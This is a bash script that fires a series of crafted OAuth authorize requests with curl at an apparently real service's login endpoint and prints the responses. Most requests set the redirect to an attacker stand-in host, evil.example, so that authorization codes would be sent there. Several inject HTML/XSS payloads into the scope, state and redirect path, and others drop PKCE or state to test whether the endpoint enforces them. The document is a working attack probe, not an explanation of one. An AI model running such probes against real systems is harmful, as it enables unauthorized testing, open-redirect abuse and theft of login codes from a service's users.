#!/bin/bash
UA='Mozilla/5.0'
CH='E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'
base='client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=openid+offline_access+atomicwork.read&state=st&code_challenge='"$CH"'&code_challenge_method=S256'
r(){ local n="$1" q="$2"; echo "===== $n"; curl -sk --max-time 20 -A "$UA" -D /tmp/as.hdr -o /tmp/as.body -w 'HTTP %{http_code} size=%{size_download}\n' "https://atomicwork.atomicwork.com/authorize?$q"; grep -iE '^(location|content-type|set-cookie)' /tmp/as.hdr | sed 's/\r$//' | head -5; head -c 160 /tmp/as.body | tr '\n' ' '; echo; }
r base "$base"
r "scope payload" "client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=%3Cimg+src%3Dx%3E&state=st&code_challenge=$CH&code_challenge_method=S256"
r "state payload" "client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=openid&state=%3Cimg+src%3Dx%3E&code_challenge=$CH&code_challenge_method=S256"
r "redirect path payload" "client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2F%253Cimg%2520src%253Dx%253E&scope=openid&state=st&code_challenge=$CH&code_challenge_method=S256"
r "redirect evil plain" "client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=openid&state=st&code_challenge=$CH&code_challenge_method=S256"
r "no pkce" "client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=openid&state=st"
r "no state" "client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=openid&code_challenge=$CH&code_challenge_method=S256"
